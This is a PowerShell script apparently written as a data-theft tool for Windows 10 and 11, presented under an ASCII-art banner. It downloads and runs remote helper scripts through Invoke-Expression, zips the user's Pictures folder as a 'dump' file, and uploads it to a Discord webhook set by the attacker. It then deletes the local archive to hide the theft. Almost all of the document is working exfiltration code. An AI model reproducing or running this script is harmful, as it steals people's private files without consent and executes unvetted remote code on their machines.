#############################################################################################################################################################################
#__________________________________________________________/\\\______________________/\\\\\\\_______________________/\\\______________________________________/\\\__        #
# ________________________________________________________/\\\\\____________________/\\\/////\\\_________________/\\\\\\\_____________________________________\/\\\__       #
#  ______________________________________________________/\\\/\\\______/\\\\\\\\\___/\\\____\//\\\_______________\/////\\\_____________________________________\/\\\__      #
#   __/\\\____/\\\__/\\/\\\\\\____/\\____/\\___/\\______/\\\/\/\\\_____/\\\/////\\\_\/\\\_____\/\\\__/\\/\\\\\\_______\/\\\__/\\\\\\\\\\\_____/\\\\\\\\_________\/\\\__     #
#    _\/\\\___\/\\\_\/\\\////\\\__\/\\\__/\\\\_/\\\____/\\\/__\/\\\____\/\\\\\\\\\\__\/\\\_____\/\\\_\/\\\////\\\______\/\\\_\///////\\\/____/\\\/////\\\___/\\\\\\\\\__    #
#     _\/\\\___\/\\\_\/\\\__\//\\\_\//\\\/\\\\\/\\\___/\\\\\\\\\\\\\\\\_\/\\\//////___\/\\\_____\/\\\_\/\\\__\//\\\_____\/\\\______/\\\/_____/\\\\\\\\\\\___/\\\////\\\__   #
#      _\/\\\___\/\\\_\/\\\___\/\\\__\//\\\\\/\\\\\___\///////////\\\//__\/\\\_________\//\\\____/\\\__\/\\\___\/\\\_____\/\\\____/\\\/______\//\\///////___\/\\\__\/\\\__  #
#       _\//\\\\\\\\\__\/\\\___\/\\\___\//\\\\//\\\______________\/\\\____\/\\\__________\///\\\\\\\/___\/\\\___\/\\\_____\/\\\__/\\\\\\\\\\\__\//\\\\\\\\\\_\//\\\\\\\/\\_ #
#        __\/////////___\///____\///_____\///__\///_______________\///_____\///_____________\///////_____\///____\///______\///__\///////////____\//////////___\///////\//__#
#                                                                                                                                                                           #
#  github.com/unwe4p0n1zed                                                tiktok.com/@unwe4p0n1zed                                                                          #
#  twitter.com/unwe4p0n1zed                                               youtube.com/@unwe4p0n1zed                                                                         #
#                                                                                                                                                                           #
#  Title: Copy-User-Pictures                                                                                                                                                #
#  Description: This PowerShell code can compress given folder and send it over Discord channel using the provided webhook URL.                                             #
#  Target: Windows 10, 11                                                                                                                                                   #
#___________________________________________________________________________________________________________________________________________________________________________#
#                                             __  __________  _      ______________ __  ________   ___  __________  ____     __                                             #
#                                            / / / / __/ __/ | | /| / /  _/_  __/ // / / ___/ _ | / _ \/ __/ __/ / / / /    / /                                             #
#                                           / /_/ _\ \/ _/   | |/ |/ _/ /  / / / _  / / /__/ __ |/ , _/ _// _// /_/ / /__  /_/                                              #
#                                           \____/___/___/   |__/|__/___/ /_/ /_//_/  \___/_/ |_/_/|_/___/_/  \____/____/ (_)                                               #
#############################################################################################################################################################################

# get all the scripts needed 
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/unwe4p0n1zed/Powershell-Scripts/main/Functions/Compress-Files/Compress-Files.ps1'))
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/unwe4p0n1zed/Powershell-Scripts/main/Functions/Upload-Discord/Upload-Discord.ps1'))
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/unwe4p0n1zed/Powershell-Scripts/main/Functions/Remove-FileOrFolder/Remove-FileOrFolder.ps1'))

# set discord webhook url
$webhookUrl = '<SET_DISCORD_URL_HERE>'
 
# compress files
$username = (Get-ChildItem Env:\USERNAME).Value
$zipFileName = "dump-$username.zip"
$filePath = Compress-Files -sp "\Pictures" -ibdsp $True -dp "\Documents" -ibddp $True -fn $zipFileName;

# send discord message and files
& Upload-Discord -t "$username dump uploading.." -f $filePath -u $webhookUrl
 
# delete the compressed file from the computer
Remove-FileOrFolder -ip $filePath -it "File" 

EXIT